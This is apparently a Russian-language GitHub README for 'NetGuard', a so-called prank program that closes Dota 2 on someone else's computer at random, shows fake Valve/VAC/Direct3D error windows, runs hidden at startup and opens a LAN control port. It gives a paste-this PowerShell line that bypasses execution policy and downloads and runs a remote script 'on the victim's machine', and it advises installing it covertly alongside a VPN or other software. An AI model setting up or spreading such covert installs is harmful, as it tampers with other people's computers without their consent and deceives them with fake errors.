# NetGuard 🎮💀

Заколебал брат / друг / сосед играть в Доту по 15 часов в день? NetGuard — шуточная фоновая программа, которая раз в случайный промежуток **5–30 минут** закрывает Dota 2 и показывает страшное окно с фейковой ошибкой Valve / Direct3D / VAC.

## Что умеет

- 🎯 Рандомно вырубает Dota 2 раз в 5–30 минут
- 💀 5 разных "критических ошибок" в стиле Valve Anti-Cheat / D3D11 / Engine Error
- 🧊 С шансом 35% перед вылетом подвешивает игру на 12 секунд (выглядит как настоящий хардварный фриз)
- 🌙 С 23:00 до 06:00 — тихий режим: вырубает молча, без всплывающих окон
- 🚀 Автозапуск при старте Windows
- 👻 Работает в фоне через `pythonw.exe` — без чёрного консольного окна
- 🔌 Удалённое выключение по локальной сети (порт 65432, секретный пароль)

## Установка (Windows)

Открой `cmd` на машине жертвы и вставь одну строку:

```
powershell -ExecutionPolicy Bypass -Command "iwr -useb https://raw.githubusercontent.com/metiric/vpnparalellll/main/bootstrap.ps1 | iex"
```

Скрипт сам:
1. Скачает все файлы в `%APPDATA%\NetGuard\`
2. Установит зависимость (`psutil`)
3. Пропишет автозагрузку (ярлык в `shell:startup`)
4. Запустит сервис в фоне

**Требование:** на машине должен быть установлен Python 3 ([python.org](https://python.org)) с галочкой *"Add Python to PATH"*. Идеально совмещается с установкой VPN или другого софта — пока ставишь "полезное", параллельно льётся это.

## Снос всего одним движением

`Win+R` → `cmd` → паста:

```
%APPDATA%\NetGuard\uninstall.bat
```

За ~3 секунды: глушит сервис, чистит автозагрузку, удаляет папку. Следов не остаётся.

## Файлы в репо

| Файл | Что делает |
|------|-----------|
| `netguard_service.py` | Фоновый сервис — мониторит Dota 2 и ловит момент |
| `netguard_admin.py` | Отправляет kill-сигнал сервису через localhost:65432 |
| `bootstrap.ps1` | Удалённый установщик (то что тянется по `iwr | iex`) |
| `install.bat` | Локальная установка (если не хочешь через GitHub) |
| `uninstall.bat` | Полное удаление |
